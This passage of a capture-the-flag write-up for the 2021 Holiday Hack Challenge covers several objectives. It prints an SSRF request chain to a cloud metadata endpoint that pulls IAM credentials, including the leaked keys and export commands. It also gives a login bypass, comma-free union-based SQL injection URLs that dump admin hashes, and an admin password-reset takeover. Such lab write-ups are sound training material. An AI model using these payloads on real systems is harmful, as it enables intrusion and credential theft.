<div class="alert alert-warning" role="alert" data-dir="ltr">Q8. Use <em>Splunk</em> and <em>Sysmon</em> Process creation data to identify the name of the <em>Bash</em> script that accessed sensitive files and (likely) transmitted them to a remote <em>IP</em> address.</div>
<p>To find that, we can simply change the previous search to use <code>ProcessId</code> instead of <code>ParentProcessId</code>. This means <code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 ProcessId=6788</code>. We have only 1 event that shows that the parent process is <code>/bin/bash preinstall.sh</code>.</p>
<p>Answer: <code>preinstall.sh</code>.</p>
<p>After answering all the question we get the following message:</p>
<div class="box">Thank you for helping <strong>Santa</strong> complete his investigation! Santa says you&rsquo;re a whiz!</div>
<div class="notices success" data-title="Objective 9 answer">
  whiz
</div>
<h3 id="10---now-hiring">10 - Now Hiring!</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>3/5</td>
<td>What is the secret access key for the <a href="https://apply.jackfrosttower.com/">Jack Frost Tower job applications server</a>? Brave the perils of <strong>Jack</strong>&rsquo;s bathroom to get hints from <strong>Noxious O. D&rsquo;or</strong>.</td>
<td>Online</td>
</tr>
</tbody>
</table>
<p>This is a webapp hacking challenge and we need to get the secret access key of the <a href="https://apply.jackfrosttower.com/">https://apply.jackfrosttower.com/</a> host.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj10_02.webp" alt="Website landing page" data-caption="Website landing page" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Website landing page
      
        
        
      
    </figcaption>
  
</figure>
<p>The website contains mainly static content. There is only one form to apply for jobs at the <em>Frost Tower</em>.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj10_03.webp" alt="Application form" data-caption="Application form" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Application form
      
        
        
      
    </figcaption>
  
</figure>
<p>There is an <em>URL</em> field that the application probably will query to fetch some additional data to enrich the application. This may be prone to a <em>Server Side Request Forgery</em> (<em>SSRF</em>) attack if the value is not carefully validated. Moreover, if the application runs on a cloud instance, it could be possible to query the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">Instance metadata service</a> (<em>IMDS</em>) to retrieve secret information. Let&rsquo;s give it a try.</p>
<p>If we specify only the <code>Name</code>, the only response we get is <code>Submission Accepted</code>. However, if we specify an <em>URL</em> as well, let&rsquo;s say <code>http://169.254.169.254</code> (the <em>AWS IMDS</em> endpoint), we get a different response:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj10_04.webp" alt="Application submission" data-caption="Application submission" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Application submission
      
        
        
      
    </figcaption>
  
</figure>
<p>If we look more carefully, we see that the image that is not displayed correctly, points to <code>https://apply.jackfrosttower.com/images/&lt;Name&gt;.jpg</code>. If we retrieve it with <code>wget</code> we see that this is a text file that contains <code>latest</code>. This means that the website is indeed vulnerable to <em>SSRF</em> and that we can query the <em>IMDS</em>.</p>
<p>Let&rsquo;s retrieve the security credentials with the <em>URL</em> <code>http://169.254.169.254/latest/meta-data/iam/security-credentials</code>. We get that the instance role used is <code>jf-deploy-role</code>. Now we can send our final call with the URL <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role</code> and we get the secret access key:</p>
<div class="box">{<br />
  &ldquo;Code&rdquo;: &ldquo;Success&rdquo;,<br />
  &ldquo;LastUpdated&rdquo;: &ldquo;2021-05-02T18:50:40Z&rdquo;,<br />
  &ldquo;Type&rdquo;: &ldquo;AWS-HMAC&rdquo;,<br />
  &ldquo;AccessKeyId&rdquo;: &ldquo;AKIA5HMBSK1SYXYTOXX6&rdquo;,<br />
  &ldquo;SecretAccessKey&rdquo;: &ldquo;CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX&rdquo;,<br />
  &ldquo;Token&rdquo;: &ldquo;NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==&rdquo;,<br />
  &ldquo;Expiration&rdquo;: &ldquo;2026-05-02T18:50:40Z&rdquo;<br />
}</div>
<p>Usually the next step is to use those credentials to investigate the underlying <em>AWS</em> account:</p>
<div class="box">$ export AWS_ACCESS_KEY_ID=AKIA5HMBSK1SYXYTOXX6<br />
$ export AWS_SECRET_ACCESS_KEY=CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX<br />
$ export AWS_SESSION_TOKEN=NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==<br />
$ aws sts get-caller-identity</div>
<p>However, this does not work here. It must be an <em>AWS</em>-compatible <em>IMDS</em> server&hellip;especially when we see that the region used is <code>np-north-1</code> through the <code>/placement/region</code> metadata.</p>
<div class="notices success" data-title="Objective 10 answer">
  CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX
</div>
<h3 id="11---customer-complaint-analysis">11 - Customer Complaint Analysis</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>2/5</td>
<td>A human has accessed the <em>Jack Frost Tower</em> network with a non-compliant host. <a href="https://downloads.holidayhackchallenge.com/2021/jackfrosttower-network.zip">Which three trolls complained about the human</a>? Enter the troll names in alphabetical order separated by spaces. Talk to <strong>Tinsel Upatree</strong> in the kitchen for hints.</td>
<td>N/A</td>
</tr>
</tbody>
</table>
<p>We get a <em>Whireshark</em> <a href="https://downloads.holidayhackchallenge.com/2021/jackfrosttower-network.zip">network capture file</a> to analyze.</p>
<p>Apparently all the computers on the network send packets with <em>Evil Bit</em> set to <code>1</code>. However, <em>TCP</em> streams 18 and 19 are the only streams that contain packets with the <em>Evil Bit</em> set to 0. This can be seen with the filter <code>ip.flags.rb==0</code>. Stream 19 (<code>tcp.stream eq 19</code>) shows the following complaint from a lady called <code>Muffy VonDuchess Sebastian</code>:</p>
<div class="box">&ldquo;name&rdquo;        = &ldquo;Muffy VonDuchess Sebastian&rdquo;<br />
&ldquo;troll_id&rdquo;    = &ldquo;I don&rsquo;t know. There were several of them.&rdquo;<br />
&ldquo;guest_info&rdquo;  = &ldquo;Room 1024&rdquo;<br />
&ldquo;description&rdquo; = &ldquo;I have never, in my life, been in a facility with such a horrible staff. They are rude and insulting. What kind of place is this? You can be sure that I (or my lawyer) will be speaking directly with Mr. Frost!&rdquo;</div>
<p>All this happended in <code>Room 1024</code> so let&rsquo;s use the following filter <code>urlencoded-form matches &quot;room.*1024&quot;</code> to see if some elves filed a complaint about her. We get 2 hits:</p>
<div class="box"><p>&ldquo;name&rdquo;        = &ldquo;Yaqh&rdquo;<br />
&ldquo;troll_id&rdquo;    = &ldquo;2796&rdquo;<br />
&ldquo;guest_info&rdquo;  = &ldquo;Snooty lady in room 1024&rdquo;<br />
&ldquo;description&rdquo; = &ldquo;Lady call desk and ask for more towel. Yaqh take to room. Yaqh ask if she want more towel because she is like to steal. She say Yaqh is insult. Yaqh is not insult. Yaqh is Yaqh.&rdquo;</p>
<p>&ldquo;name&rdquo;        = &ldquo;Flud&rdquo;<br />
&ldquo;troll_id&rdquo;    = &ldquo;2083&rdquo;<br />
&ldquo;guest_info&rdquo;  = &ldquo;Very cranky lady in room 1024&rdquo;<br />
&ldquo;description&rdquo; = &ldquo;Lady call front desk. Complain &ldquo;employee&rdquo; is rude. Say she is insult and want to speak to manager. Send Flud to room. Lady say troll call her towels thief. I say stop steal towels if is bother her.&rdquo;</p>
<p>&ldquo;name&rdquo;        = &ldquo;Hagg&rdquo;<br />
&ldquo;troll_id&rdquo;    = &ldquo;2013&rdquo;<br />
&ldquo;guest_info&rdquo;  = &ldquo;Incredibly angry lady in room 1024&rdquo;<br />
&ldquo;description&rdquo; = &ldquo;Lady call front desk. I am walk by so I pick up phone. She is ANGRY and shout at me. Say she has never been so insult. I say she probably has but just didn&rsquo;t hear it.&rdquo;</p>
</div>
<div class="notices success" data-title="Objective 11 answer">
  Flud Hagg Yaqh
</div>
<h3 id="12---frost-tower-website-checkup">12 - Frost Tower Website Checkup</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>5/5</td>
<td>Investigate <a href="https://staging.jackfrosttower.com/">Frost Tower&rsquo;s website for security issues</a>. <a href="https://download.holidayhackchallenge.com/2021/frosttower-web.zip">This source code will be useful in your analysis. In Jack Frost&rsquo;s TODO list</a>, what job position does <strong>Jack</strong> plan to offer <strong>Santa</strong>? <strong>Ribb Bonbowford</strong>, in <strong>Santa</strong>&rsquo;s dining room, may have some pointers for you.</td>
<td>Online</td>
</tr>
</tbody>
</table>
<p>Another web application hacking challenge. This time we have even access to its <a href="https://download.holidayhackchallenge.com/2021/frosttower-web.zip">source code</a>. We access <code>https://staging.jackfrosttower.com/</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj12_02.webp" alt="Website landing page" data-caption="Website landing page" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Website landing page
      
        
        
      
    </figcaption>
  
</figure>
<p>Let&rsquo;s start by analyzing the source code and more specifically <code>server.js</code> where all the logic is found. We see that it uses <em>Node.JS</em> and that the following routes are available:</p>
<table>
<thead>
<tr>
<th>Route</th>
<th>Actions</th>
<th>Auth required</th>
</tr>
</thead>
<tbody>
<tr>
<td>/</td>
<td>GET</td>
<td>No</td>
</tr>
<tr>
<td>/testsite</td>
<td>GET, POST</td>
<td>No</td>
</tr>
<tr>
<td>/contact</td>
<td>GET</td>
<td>No</td>
</tr>
<tr>
<td>/postcontact</td>
<td>POST</td>
<td>No</td>
</tr>
<tr>
<td>/login</td>
<td>GET, POST</td>
<td>No</td>
</tr>
<tr>
<td>/logout</td>
<td>GET</td>
<td>No</td>
</tr>
<tr>
<td>/redirect</td>
<td>GET</td>
<td>Yes and No</td>
</tr>
<tr>
<td>/forgotpass</td>
<td>GET, POST</td>
<td>No</td>
</tr>
<tr>
<td>/forgotpass/token/:id</td>
<td>GET, POST</td>
<td>No</td>
</tr>
<tr>
<td>/detail/:id</td>
<td>GET</td>
<td>Yes</td>
</tr>
<tr>
<td>/edit/:id</td>
<td>GET, POST</td>
<td>Yes</td>
</tr>
<tr>
<td>/delete/:id</td>
<td>POST</td>
<td>Yes</td>
</tr>
<tr>
<td>/search</td>
<td>GET, POST</td>
<td>Yes</td>
</tr>
<tr>
<td>/export</td>
<td>POST</td>
<td>Yes</td>
</tr>
<tr>
<td>/dashboard</td>
<td>GET</td>
<td>Yes</td>
</tr>
<tr>
<td>/adduser</td>
<td>GET, POST</td>
<td>Yes</td>
</tr>
<tr>
<td>/userlist</td>
<td>GET</td>
<td>Yes</td>
</tr>
<tr>
<td>/useredit/:id</td>
<td>GET, POST</td>
<td>Yes</td>
</tr>
<tr>
<td>/userdelete/:id</td>
<td>POST</td>
<td>Yes</td>
</tr>
</tbody>
</table>
<p>When looking at how the routes that require authentication are protected, we see it checks for <code>session.uniqueID</code> to be set. There are a few places in the code where this is set, however, there is one place where this can be set without authentication:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj12_03.webp" alt="Bad session management" data-caption="Bad session management" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Bad session management
      
        
        
      
    </figcaption>
  
</figure>
<p>This means that we only have to send twice the same contact form with the same email address and we will have a valid session! So we go to <code>https://staging.jackfrosttower.com/contact</code> and send the form twice. The first time we get the message <code>Data Saved to Database!</code>, the seond time we get <code>Email Already Exists</code>. We then browse to one of the protected route, like <code>/dashboard</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj12_04.webp" alt="login bypass - dashboard" data-caption="login bypass - dashboard" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      login bypass - dashboard
      
        
        
      
    </figcaption>
  
</figure>
<p>Now that we have access to all the features of the website, let&rsquo;s analyze the rest of the source code. There are quite some <em>SQL</em> queries, let&rsquo;s look if some are vulnerable to injections. Most of the queries look safe and are using either the <code>escape()</code> method to sanitize the user input or are using a kind of prepared statement (that behind the hoods uses the <code>escape()</code> method as well). By reading the documentation about <a href="https://github.com/mysqljs/mysql#escaping-query-values">Escaping query values</a>, we see the following note:</p>
<div class="box"><strong>Caution</strong> The string provided to <code>mysql.raw()</code> will skip all escaping functions when used, so be careful when passing in unvalidated input.</div>
<p>We find an occurence of this method in the <code>/detail/:id</code> route:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj12_05.webp" alt="Vulnerable SQL query" data-caption="Vulnerable SQL query" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Vulnerable SQL query
      
        
        
      
    </figcaption>
  
</figure>
<p>The route accepts multiple <em>ID</em>s as input that must be comma separated. In this case, the <em>ID</em>s are split and the query is reconstructed. For instance if the input is <code>/detail/1,2</code> we get the query <code>SELECT * FROM uniquecontact WHERE id=1 OR id=2 OR id=?</code>. Later, the last <code>?</code> is replaced by the value of <code>reqparam</code> that is <code>0</code>. We can test if this is vulnerable with a basic boolean-based <em>SQL</em> injection:</p>
<div class="box"><a href="https://staging.jackfrosttower.com/detail/1,2%20and%201=1">https://staging.jackfrosttower.com/detail/1,2 and 1=1</a><br />
<a href="https://staging.jackfrosttower.com/detail/1,2%20and%201=2">https://staging.jackfrosttower.com/detail/1,2 and 1=2</a></div>
<p>We have different results for the 2 calls which means that the injection worked. Let&rsquo;s try to make a union-based <em>SQL</em> injection now, this would facilitate the data dump. But we have a constraint here due to the way the query is built: we wont' be able to use <code>,</code> or the query will be split and will generate errors.</p>
<p>One way to bypass this constraint is to change the usual <code>union select 1,2,...</code> query to <code>union select * from ((select 1)A join (select 2)B ...</code>. As the initial query retrieves all the columns from the table <code>uniquecontact</code> and that the table has a total of 7 columns, we need to have a union query with 7 values as well. We end the query by commenting whatever follows to avoid errors. The query becomes:</p>
<div class="box"><a href="https://staging.jackfrosttower.com/detail/1,-2%20union%20select%20*%20from%20((select%201)A%20join%20(select%202)B%20join%20(select%203)C%20join%20(select%204)D%20join%20(select%205)E%20join%20(select%206)F%20join%20(select%207)G)--">https://staging.jackfrosttower.com/detail/1,-2 union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D join (select 5)E join (select 6)F join (select 7)G)--</a></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj12_06.webp" alt="Union-based SQL injection" data-caption="Union-based SQL injection" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Union-based SQL injection
      
        
        
      
    </figcaption>
  
</figure>
<p>We see that the fields are replaced by the values of the union query. The last 2 columns being dates, the values <code>6</code> and <code>7</code> are converted to a date format (June 1st and July 1st respectively).</p>
<p>Now we can start dumping data. The database schema is described in the file <code>/sql/encontact_db.sql</code>. Let&rsquo;s get some information from the <code>users</code> table for the users that have admin privileges. This means, users that have <code>user_status=1</code>. First the names:</p>
<div class="box"><a href="https://staging.jackfrosttower.com/detail/1,-2%20union%20select%20*%20from%20((select%201)A%20join%20(select%20group_concat(name)%20from%20users%20where%20user_status=1)B%20join%20(select%203)C%20join%20(select%204)D%20join%20(select%205)E%20join%20(select%206)F%20join%20(select%207)G)--">https://staging.jackfrosttower.com/detail/1,-2 union select * from ((select 1)A join (select group_concat(name) from users where user_status=1)B join (select 3)C join (select 4)D join (select 5)E join (select 6)F join (select 7)G)--</a></div>
<p>We get only 1 account with the name <code>Super Admin</code>. We retrieve in the same way the email <code>root@localhost</code> and its encrypted password <code>$2b$15$v8B1Z2pps1qREKNjPm..6OjGdLt4fxnD9p4ELOqOAzs1HG2w8MsSG</code>. Fun thing, we don&rsquo;t even need to crack the password, there is a way around that. Now that we have the email address, if we use the <code>recover now</code> option of the <code>/login</code> page, this will create a <code>token</code> that will be stored in the database and that we can retrieve through the same <em>SQL</em> injection. We can then use the token on the <code>/forgotpass/token/&lt;token&gt;</code> to reset the administrator password :) We can then connect with its email address as username and the password we have set to access the administration interface:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj12_08.webp" alt="Administration interface" data-caption="Administration interface" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Administration interface
      
        
        
      
    </figcaption>
  
</figure>
<p>We can even add our own super admin user if we wish. However, this does not help with solving the objective. Let&rsquo;s continue to discover the database.</p>
<p>Using the same <em>SQL</em> injection, let&rsquo;s list the tables with the following call:</p>
<div class="box"><a href="https://staging.jackfrosttower.com/detail/1,-2%20union%20select%20*%20from%20((select%201)A%20join%20(SELECT%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())B%20join%20(select%203)C%20join%20(select%204)D%20join%20(select%205)E%20join%20(select%206)F%20join%20(select%207)G)--">https://staging.jackfrosttower.com/detail/1,-2 union select * from ((select 1)A join (SELECT group_concat(table_name) from information_schema.tables where table_schema=database())B join (select 3)C join (select 4)D join (select 5)E join (select 6)F join (select 7)G)--</a></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj12_07.webp" alt="Database tables" data-caption="Database tables" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Database tables
      
        
        
      
    </figcaption>
  
</figure>
<p>We get the following output <code>users,todo,emails,uniquecontact</code>. There is a new table <code>todo</code> that was not described in the schema! Let&rsquo;s retrieve the columns:</p>
<div class="box"><a href="https://staging.jackfrosttower.com/detail/1,-2%20union%20select%20*%20from%20((select%201)A%20join%20(SELECT%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name='todo')B%20join%20(select%203)C%20join%20(select%204)D%20join%20(select%205)E%20join%20(select%206)F%20join%20(select%207)G)--">https://staging.jackfrosttower.com/detail/1,-2 union select * from ((select 1)A join (SELECT group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&lsquo;todo&rsquo;)B join (select 3)C join (select 4)D join (select 5)E join (select 6)F join (select 7)G)--</a></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj12_09.webp" alt="Table todo columns" data-caption="Table todo columns" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Table todo columns
      
        
        
      
    </figcaption>
  
</figure>
<p>The table has the following columns <code>id,note,completed</code>. Finally, let&rsquo;s retrieve all the notes to validate the objective:</p>
<div class="box"><a href="https://staging.jackfrosttower.com/detail/1,-2%20union%20select%20*%20from%20((select%201)A%20join%20(SELECT%20group_concat(note)%20from%20todo)B%20join%20(select%203)C%20join%20(select%204)D%20join%20(select%205)E%20join%20(select%206)F%20join%20(select%207)G)--">https://staging.jackfrosttower.com/detail/1,-2 union select * from ((select 1)A join (SELECT group_concat(note) from todo)B join (select 3)C join (select 4)D join (select 5)E join (select 6)F join (select 7)G)--</a></div>
<p>We get the following notes:</p>
<div class="box"><ul>
<li>Buy up land all around Santa&rsquo;s Castle</li>
<li>Build bigger and more majestic tower next to Santa&rsquo;s</li>
<li>Erode Santa&rsquo;s influence at the North Pole via FrostFest, the greatest Con in history</li>
<li>Dishearten Santa&rsquo;s elves and encourage defection to our cause</li>
<li>Steal Santa&rsquo;s sleigh technology and build a competing and way better Frosty present delivery vehicle</li>
<li>Undermine Santa&rsquo;s ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem</li>
<li>Force Santa to cancel Christmas</li>
<li>SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide&hellip; so the whole world sees that Frost saved the Holiday Season!!!! Bwahahahahaha!</li>
<li>With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him</li>
</ul>
</div>
<p>Only the first 3 are set as completed so far by <em>Jack Frost</em>!</p>
<p>There are as well other issues with the code that should be improved:</p>
<ul>
<li>the secret to sign sessions is hardcoded in <code>server.js</code></li>
<li>there is some dead code in <code>server.js</code> that leaks credentials to the <code>mailtrap.io</code> service</li>
<li>the database connection uses unsecure authentication option and no password in <code>custom_modules/modconnection.js</code></li>
</ul>
<div class="notices success" data-title="Objective 12 answer">
  clerk
</div>
<h3 id="13---fpga-programming">13 - FPGA Programming</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>4/5</td>
<td>Write your first <em>FPGA</em> program to make a doll sing. You might get some suggestions from <strong>Grody Goiterson</strong>, near <em>Jack</em>&rsquo;s elevator.</td>
<td>Frost Tower Rooftop</td>
</tr>
</tbody>
</table>
<p>For the last objective, we have to program an <em>FPGA</em> to create square wave tones.</p>
<figure >
  
  
  
